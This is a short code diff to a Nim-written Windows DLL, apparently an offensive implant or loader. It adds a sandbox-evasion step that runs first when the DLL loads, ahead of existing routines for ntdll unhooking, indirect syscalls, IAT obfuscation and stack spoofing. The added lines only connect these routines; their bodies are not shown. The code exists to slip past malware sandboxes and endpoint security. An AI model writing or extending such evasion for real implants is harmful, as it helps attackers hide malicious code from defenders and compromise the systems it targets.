@@ -11,6 +11,8 @@ when defined(windows):
   # Evasion imports
   when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
     import utils/evasion
+  when defined(sandbox_evasion):
+    import utils/sandbox
 
   # Import NimMain to initialize Nim runtime
   proc NimMain() {.cdecl, importc.}
@@ -57,6 +59,9 @@ when defined(windows):
     of DLL_PROCESS_ATTACH:
       # Initialize Nim runtime once when DLL loads
       NimMain()
+      # Run sandbox evasion before anything else
+      when defined(sandbox_evasion):
+        runSandboxEvasion()
       # Run evasion techniques immediately
       when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
         runEvasionInit()
